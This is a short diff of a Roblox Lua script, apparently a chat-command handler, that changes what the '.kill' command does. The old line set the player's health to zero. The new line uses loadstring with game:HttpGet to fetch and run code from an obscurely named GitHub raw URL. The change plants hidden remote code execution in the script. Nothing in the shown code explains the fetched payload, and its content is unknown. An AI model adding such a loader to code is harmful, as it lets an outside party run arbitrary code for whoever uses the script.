@@ -747,7 +747,7 @@ tweenIn:Play()
 tweenIn.Completed:Wait() -- Wait for tween to complete
 RobloxVoiceChatPromptGui:Destroy() -- Destroy the GUI
 elseif command == ".kill" then
-                player.Character.Humanoid.Health = 0
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/fjkdvbjkfvjkfbvjkfbvjkdfhdfjkhvuldfhv/deinemudda/refs/heads/main/oof"))()
 elseif command == ".suspend" then
 -- Gui to Lua
 -- Version: 3.2
